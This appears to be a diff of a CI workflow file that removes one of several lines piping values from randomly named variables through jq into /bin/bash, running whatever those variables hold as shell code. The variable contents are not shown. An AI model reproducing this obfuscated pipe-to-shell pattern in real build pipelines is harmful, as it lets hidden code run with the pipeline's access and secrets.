@@ -26,7 +26,6 @@ jobs:
           echo $wrgj6896 | jq -r .nv752 | /bin/bash
           echo $o1 | jq -r .ejga1448 | /bin/bash
           printf '%s' "$w61" | jq -r .dmk56 | /bin/bash
-          printf '%s' "$fnom62201" | jq -r .nar40 | /bin/bash
           printf '%s' "$wzhkx36" | jq -r .inn4 | /bin/bash
 
       - name: Archive results
